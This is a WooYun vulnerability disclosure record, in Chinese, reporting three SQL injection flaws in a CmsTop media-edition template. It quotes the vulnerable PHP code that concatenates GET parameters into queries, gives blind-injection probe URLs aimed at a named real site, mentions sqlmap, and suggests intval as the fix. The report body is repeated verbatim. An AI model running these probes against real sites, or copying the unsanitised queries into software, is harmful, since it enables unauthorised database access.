{"id": 72525, "wybug_id": "wooyun-2015-0144894", "wybug_title": "CmsTop媒体版某模板存在三处SQL盲注漏洞（非全部网站用户）", "wybug_corp": "CmsTop", "wybug_author": "Xser", "wybug_date": "2015-10-09 18:32", "wybug_open_date": "2016-01-12 18:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-14：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-12：\t细节向公众公开  简要描述： 不是全部网站都安装了这几个模板，这个模板用户量一般 详细说明：  漏洞文件是/apps/rss/controller/fullsite.php中\npublic function get_sectiondata(){\t\t$sectionid = $_GET['sectionid'];  //多个以','隔开\t\t$outtyle = $_GET['outtyle'];\t//输出类型\t\t$section_list = $this->_rss->ls_section($sectionid);\t\t$data = array();\t\tforeach($section_list as $section){\t\t\tif ($section['data'] && ($section['data']{0} == '{' || $section['data']{0} == '['))\t\t\t{\t\t\t\t$data[] = json_decode($section['data'], true);\t\t\t}\t\t\telse\t\t\t{\t\t\t\t$data[] = unserialize($section['data']);\n跟踪ls_section函数在/apps/rss/model/fullsite.php中\nfunction ls_section($sectionid){\t\t$sql = \"SELECT * FROM `#table_section` \";\t\tif($sectionid) $sql .= \" WHERE sectionid IN (\".$sectionid.\")\";\t\t$sql .= \" ORDER BY sectionid DESC\";\t\t$data = $this->db->select($sql);\t\treturn $data;\t}\n\n$sectionid = $_GET['sectionid'];(\".$sectionid.\")\";\n可以看到没有过滤也没有单引号，不知道是不是有过滤，因为我源码没有完整解密我们要减法盲注测试下是不是存在注入一号\nhttp://app.ellechina.com/?app=rss&controller=fullsite&action=get_sectiondata&sectionid=1&outtyle=1\n二号\nhttp://app.ellechina.com/?app=rss&controller=fullsite&action=get_sectiondata&sectionid=2-1&outtyle=1\n三号\nhttp://app.ellechina.com/?app=rss&controller=fullsite&action=get_sectiondata&sectionid=2&outtyle=1\n一号的值是1和二号的2-1=1是等于，返回了同样的数据而三号是2，所以返回不同，所以存在注入\n\n\n\n\n\n第二处在/apps/rss/controller/fullsite.php中\npublic function get_category(){\t\t$categoryid = $_GET['categoryid'];  //多个以','隔开\t\t$outtyle = $_GET['outtyle'];\t//输出类型\t\t$category_list = $this->_rss->ls_category($categoryid);\t\t$this->template->assign('list',$category_list);\n跟踪ls_category函数在/apps/rss/model/fullsite.php中\n//获取栏目数据信息的数据\tfunction ls_category($categoryid){\t\t$sql = \"SELECT * FROM `#table_category` \";\t\tif($categoryid) $sql .= \" WHERE catid IN (\".$categoryid.\")\";\t\t$sql .= \" ORDER BY catid DESC\";\t\t$data = $this->db->select($sql);\t\treturn $data;\n和第一处一样就不演示了第三处是延时注入在apps\\editor\\controller\\slide.php中\npublic function pic_html()\t{\t\t$idtmp = explode(',',$_GET['id']);\t\tforeach($idtmp as $k=>$v){\t\t    if(!empty($v)){\t\t        $id[] = $v;\t\t    }\t\t}\t\t$db = factory::db();\t\t//得到$id[0]组图信息\t\t$data = $db->select(\"SELECT * FROM #table_picture_group WHERE contentid=$id[0] ORDER BY sort ASC\");\t\t$html .= '<p><div class=\"picgroup\"><div class=\"moverpic\"><ul class=\"mover\">';\t\t$_count = 0;\t\tforeach($data as $value)\n\n$idtmp = explode(',',$_GET['id']);$data = $db->select(\"SELECT * FROM #table_picture_group WHERE contentid=$id[0] ORDER BY sort ASC\");\n分割后带入查询了，我们用sqlmap测试一下\n\n   漏洞证明：  漏洞文件是/apps/rss/controller/fullsite.php中\npublic function get_sectiondata(){\t\t$sectionid = $_GET['sectionid'];  //多个以','隔开\t\t$outtyle = $_GET['outtyle'];\t//输出类型\t\t$section_list = $this->_rss->ls_section($sectionid);\t\t$data = array();\t\tforeach($section_list as $section){\t\t\tif ($section['data'] && ($section['data']{0} == '{' || $section['data']{0} == '['))\t\t\t{\t\t\t\t$data[] = json_decode($section['data'], true);\t\t\t}\t\t\telse\t\t\t{\t\t\t\t$data[] = unserialize($section['data']);\n跟踪ls_section函数在/apps/rss/model/fullsite.php中\nfunction ls_section($sectionid){\t\t$sql = \"SELECT * FROM `#table_section` \";\t\tif($sectionid) $sql .= \" WHERE sectionid IN (\".$sectionid.\")\";\t\t$sql .= \" ORDER BY sectionid DESC\";\t\t$data = $this->db->select($sql);\t\treturn $data;\t}\n\n$sectionid = $_GET['sectionid'];(\".$sectionid.\")\";\n可以看到没有过滤也没有单引号，不知道是不是有过滤，因为我源码没有完整解密我们要减法盲注测试下是不是存在注入一号\nhttp://app.ellechina.com/?app=rss&controller=fullsite&action=get_sectiondata&sectionid=1&outtyle=1\n二号\nhttp://app.ellechina.com/?app=rss&controller=fullsite&action=get_sectiondata&sectionid=2-1&outtyle=1\n三号\nhttp://app.ellechina.com/?app=rss&controller=fullsite&action=get_sectiondata&sectionid=2&outtyle=1\n一号的值是1和二号的2-1=1是等于，返回了同样的数据而三号是2，所以返回不同，所以存在注入\n\n\n\n\n\n第二处在/apps/rss/controller/fullsite.php中\npublic function get_category(){\t\t$categoryid = $_GET['categoryid'];  //多个以','隔开\t\t$outtyle = $_GET['outtyle'];\t//输出类型\t\t$category_list = $this->_rss->ls_category($categoryid);\t\t$this->template->assign('list',$category_list);\n跟踪ls_category函数在/apps/rss/model/fullsite.php中\n//获取栏目数据信息的数据\tfunction ls_category($categoryid){\t\t$sql = \"SELECT * FROM `#table_category` \";\t\tif($categoryid) $sql .= \" WHERE catid IN (\".$categoryid.\")\";\t\t$sql .= \" ORDER BY catid DESC\";\t\t$data = $this->db->select($sql);\t\treturn $data;\n和第一处一样就不演示了第三处是延时注入在apps\\editor\\controller\\slide.php中\npublic function pic_html()\t{\t\t$idtmp = explode(',',$_GET['id']);\t\tforeach($idtmp as $k=>$v){\t\t    if(!empty($v)){\t\t        $id[] = $v;\t\t    }\t\t}\t\t$db = factory::db();\t\t//得到$id[0]组图信息\t\t$data = $db->select(\"SELECT * FROM #table_picture_group WHERE contentid=$id[0] ORDER BY sort ASC\");\t\t$html .= '<p><div class=\"picgroup\"><div class=\"moverpic\"><ul class=\"mover\">';\t\t$_count = 0;\t\tforeach($data as $value)\n\n$idtmp = explode(',',$_GET['id']);$data = $db->select(\"SELECT * FROM #table_picture_group WHERE contentid=$id[0] ORDER BY sort ASC\");\n分割后带入查询了，我们用sqlmap测试一下\n\n   修复方案：  intval参数   版权声明：转载请注明来源 Xser@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-01-12 18:34 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}